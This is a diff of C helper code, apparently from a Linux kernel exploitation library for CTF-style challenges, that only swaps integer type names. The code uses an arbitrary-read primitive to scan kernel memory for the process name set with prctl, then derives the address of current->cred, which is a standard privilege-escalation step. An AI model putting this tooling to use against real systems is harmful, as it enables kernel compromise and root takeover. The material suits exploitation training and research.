@@ -9,19 +9,19 @@
 
 #include "util.h"
 
-static bool found_target(void *const addr, void *const target, const uint64_t len,
-                         uint32_t (*aar32)(void *), uint64_t (*aar64)(void *)) {
+static bool found_target(void *const addr, void *const target, const u64 len,
+                         u32 (*aar32)(void *), u64 (*aar64)(void *)) {
     if (likely(aar32 != NULL)) {
-        for (uint64_t offset = 0; offset < len; offset += 4) {
-            uint32_t actual;
-            uint32_t expect;
+        for (u64 offset = 0; offset < len; offset += 4) {
+            u32 actual;
+            u32 expect;
             if (likely(offset + 4 <= len)) {
                 actual = aar32(addr + offset);
-                expect = *(uint32_t *)(target + offset);
+                expect = *(u32 *)(target + offset);
             } else {
-                uint64_t rest = len - offset;
+                u64 rest = len - offset;
                 actual = aar32(addr + offset);
-                expect = (*(uint32_t *)(target + offset)) & ((1u << (8 * rest)) - 1);
+                expect = (*(u32 *)(target + offset)) & ((1u << (8 * rest)) - 1);
             }
             if (likely(actual != expect)) {
                 return false;
@@ -30,16 +30,16 @@ static bool found_target(void *const addr, void *const target, const uint64_t le
         return true;
     }
     if (aar64 != NULL) {
-        for (uint64_t offset = 0; offset < len; offset += 8) {
-            uint64_t actual;
-            uint64_t expect;
+        for (u64 offset = 0; offset < len; offset += 8) {
+            u64 actual;
+            u64 expect;
             if (likely(offset + 8 <= len)) {
                 actual = aar64(addr + offset);
-                expect = *(uint64_t *)(target + offset);
+                expect = *(u64 *)(target + offset);
             } else {
-                uint64_t rest = len - offset;
+                u64 rest = len - offset;
                 actual = aar64(addr + offset);
-                expect = (*(uint64_t *)(target + offset)) & ((1ull << (8 * rest)) - 1);
+                expect = (*(u64 *)(target + offset)) & ((1ull << (8 * rest)) - 1);
             }
             if (likely(actual != expect)) {
                 return false;
@@ -50,16 +50,16 @@ static bool found_target(void *const addr, void *const target, const uint64_t le
     return false;
 }
 
-void *find_target_from_heap(void *const addr_start, void *const target, const uint64_t len,
-                            uint32_t (*aar32)(void *), uint64_t (*aar64)(void *)) {
+void *find_target_from_heap(void *const addr_start, void *const target, const u64 len,
+                            u32 (*aar32)(void *), u64 (*aar64)(void *)) {
     if (unlikely(aar32 == NULL && aar64 == NULL)) {
         puts("[-] please implement aar function");
         return NULL;
     }
 
-    uint64_t addr;
+    u64 addr;
     if (likely(aar32 != NULL)) {
-        for (addr = (uint64_t)addr_start;; addr += 8) {
+        for (addr = (u64)addr_start;; addr += 8) {
             if ((addr & 0xffff) == 0) {
                 printf("      searching %p...\n", (void *)addr);
             }
@@ -69,7 +69,7 @@ void *find_target_from_heap(void *const addr_start, void *const target, const ui
             }
         }
     } else if (aar64 != NULL) {
-        for (addr = (uint64_t)addr_start;; addr += 8) {
+        for (addr = (u64)addr_start;; addr += 8) {
             if ((addr & 0xffff) == 0) {
                 printf("      searching %p...\n", (void *)addr);
             }
@@ -82,7 +82,7 @@ void *find_target_from_heap(void *const addr_start, void *const target, const ui
     return NULL;
 }
 
-void *find_comm(void *const addr_start, uint32_t (*aar32)(void *), uint64_t (*aar64)(void *)) {
+void *find_comm(void *const addr_start, u32 (*aar32)(void *), u64 (*aar64)(void *)) {
     char name[] = "kernel pwnable";
     assert(sizeof(name) <= 16);
     CHECK(prctl(PR_SET_NAME, name));
@@ -90,17 +90,17 @@ void *find_comm(void *const addr_start, uint32_t (*aar32)(void *), uint64_t (*aa
     return find_target_from_heap(addr_start, name, sizeof(name), aar32, aar64);
 }
 
-void *comm_to_addr_cred(void *addr_comm, uint32_t (*aar32)(void *), uint64_t (*aar64)(void *)) {
+void *comm_to_addr_cred(void *addr_comm, u32 (*aar32)(void *), u64 (*aar64)(void *)) {
     puts("[ ] locating current->cred from current->comm");
     if (unlikely(aar32 == NULL && aar64 == NULL)) {
         puts("[-] please implement aar function");
         return NULL;
     }
 
-    uint64_t addr_cred = 0;
+    u64 addr_cred = 0;
     if (likely(aar32 != NULL)) {
         addr_cred |= aar32(addr_comm - 8);
-        addr_cred |= (uint64_t)aar32(addr_comm - 4) << 32;
+        addr_cred |= (u64)aar32(addr_comm - 4) << 32;
         printf("[+] current->cred at %p\n", (void *)addr_cred);
     } else if (aar64 != NULL) {
         addr_cred |= aar64(addr_comm - 8);
@@ -109,8 +109,8 @@ void *comm_to_addr_cred(void *addr_comm, uint32_t (*aar32)(void *), uint64_t (*a
     return (void *)addr_cred;
 }
 
-void dump_buffer_aar(void *addr_start, const uint64_t row, uint32_t (*aar32)(void *),
-                     uint64_t (*aar64)(void *)) {
+void dump_buffer_aar(void *addr_start, const u64 row, u32 (*aar32)(void *),
+                     u64 (*aar64)(void *)) {
     if (unlikely(aar32 == NULL && aar64 == NULL)) {
         puts("[-] please implement aar function");
         return;
@@ -118,13 +118,13 @@ void dump_buffer_aar(void *addr_start, const uint64_t row, uint32_t (*aar32)(voi
 
     printf("[ ] buffer dump by aar from %p\n", addr_start);
     if (likely(aar32 != NULL)) {
-        for (uint64_t i = 0; i < row; i++) {
-            uint64_t val = 0;
+        for (u64 i = 0; i < row; i++) {
+            u64 val = 0;
             val |= aar32(addr_start + i * 8);
-            val |= (uint64_t)aar32(addr_start + i * 8 + 4) << 32;
-            uint8_t ascii[9] = {0};
-            *(uint64_t *)ascii = val;
-            for (uint64_t j = 0; j < 8; j++) {
+            val |= (u64)aar32(addr_start + i * 8 + 4) << 32;
+            u8 ascii[9] = {0};
+            *(u64 *)ascii = val;
+            for (u64 j = 0; j < 8; j++) {
                 if (ascii[j] < 0x20 || ascii[j] == 0x7f) {
                     ascii[j] = '.';
                 }
@@ -132,11 +132,11 @@ void dump_buffer_aar(void *addr_start, const uint64_t row, uint32_t (*aar32)(voi
             printf("      %p|+0x%03lx: 0x%016lx  |%s|\n", addr_start + i * 8, i * 8, val, ascii);
         }
     } else if (aar64 != NULL) {
-        for (uint64_t i = 0; i < row; i++) {
-            uint64_t val = aar64(addr_start + i * 8);
-            uint8_t ascii[9] = {0};
-            *(uint64_t *)ascii = val;
-            for (uint64_t j = 0; j < 8; j++) {
+        for (u64 i = 0; i < row; i++) {
+            u64 val = aar64(addr_start + i * 8);
+            u8 ascii[9] = {0};
+            *(u64 *)ascii = val;
+            for (u64 j = 0; j < 8; j++) {
                 if (ascii[j] < 0x20 || ascii[j] == 0x7f) {
                     ascii[j] = '.';
                 }
